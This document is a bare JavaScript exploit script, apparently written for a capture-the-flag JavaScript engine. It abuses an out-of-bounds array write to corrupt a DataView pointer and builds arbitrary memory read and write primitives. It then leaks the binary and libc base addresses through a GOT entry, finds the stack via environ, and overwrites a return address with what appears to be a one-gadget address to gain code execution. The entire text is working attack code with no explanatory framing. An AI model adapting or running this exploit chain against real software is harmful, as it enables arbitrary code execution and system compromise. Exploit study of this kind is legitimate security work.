function hex(i) {
  return "0x" + i.toString(16).padStart(16, "0");
}

function aar(addr, dv1, dv2) {
  dv1.setBigUint64(0, addr, true);
  if (dv2.buffer) {
    return dv2.getBigUint64(0, true);
  }
  return 0;
}

function aaw(addr, value, dv1, dv2) {
  dv1.setBigUint64(0, addr, true);
  dv2.setBigUint64(0, value, true);
}

let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];
a1 = new ArrayBuffer(0x1000);
d1 = new DataView(a1);
d1.setUint32(0, 0x41414141, true);
a2 = new ArrayBuffer(0x1000);
d2 = new DataView(a2);
d2.setUint32(0, 0x42424242, true);
a.pop();
var offset = a[242] - 0x3c;
a[242] = offset;
buffer_p = Number(d1.getBigUint64(0, true));
elf_base = buffer_p - 0x26db80;
print(hex(elf_base));
free_got = Number(aar(elf_base + 0x26adf8, d1, d2));
libc_base = free_got - 0x97910;
environ = libc_base + 0x61c118;
stack = Number(aar(environ, d1, d2));
libc_start_main_ret = stack - 0xf8;
aaw(libc_start_main_ret, libc_base + 0x10a2fc, d1, d2);
aar(environ, d1, d2);
